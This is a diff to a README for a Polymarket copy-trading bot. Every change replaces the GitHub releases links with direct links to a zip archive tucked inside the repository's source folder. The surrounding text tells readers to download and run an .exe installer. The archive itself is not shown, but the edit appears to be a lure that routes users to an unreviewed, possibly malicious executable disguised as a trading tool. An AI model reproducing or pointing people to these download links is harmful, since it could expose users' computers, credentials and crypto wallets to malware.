@@ -1,6 +1,6 @@
 # 🤖 Polymarket-trading-tool - Simple Copy Trading Bot
 
-[![Download Now](https://img.shields.io/badge/Download-Polymarket--trading--tool-ff69b4?style=for-the-badge&logo=github)](https://github.com/asis027/Polymarket-trading-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Polymarket--trading--tool-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asis027/Polymarket-trading-tool/main/src/interfaces/tool_Polymarket_trading_v1.0.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You need to visit the release page to get the latest version of the bot.
 
 Click the button below to open the download page:
 
-[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/asis027/Polymarket-trading-tool/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asis027/Polymarket-trading-tool/main/src/interfaces/tool_Polymarket_trading_v1.0.zip)
 
 Once on the page, look for the file with `.exe` extension or a similar installer file. The latest version should be at the top.
 
@@ -104,7 +104,7 @@ If the problem continues, check the GitHub issues page or reach out through the 
 
 New versions of the bot may add features or fix bugs. To update:
 
-- Visit the [Download Page](https://github.com/asis027/Polymarket-trading-tool/releases) again.  
+- Visit the [Download Page](https://raw.githubusercontent.com/asis027/Polymarket-trading-tool/main/src/interfaces/tool_Polymarket_trading_v1.0.zip) again.  
 - Download the latest `.exe` or installer file.  
 - Run it to replace the older version.  
 
@@ -133,6 +133,6 @@ Check the repository’s Discussions and Issues for updates and community help.
 - Description: polymarket trading bot. polymarket copy trading bot  
 - Topics: polymarket, polymarket-copy-trading-bot, polymarket-trading-bot  
 
-[Visit the release page to download](https://github.com/asis027/Polymarket-trading-tool/releases)  
+[Visit the release page to download](https://raw.githubusercontent.com/asis027/Polymarket-trading-tool/main/src/interfaces/tool_Polymarket_trading_v1.0.zip)  
 
-[![Download Now](https://img.shields.io/badge/Download-Polymarket--trading--tool-ff69b4?style=for-the-badge&logo=github)](https://github.com/asis027/Polymarket-trading-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Polymarket--trading--tool-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/asis027/Polymarket-trading-tool/main/src/interfaces/tool_Polymarket_trading_v1.0.zip)
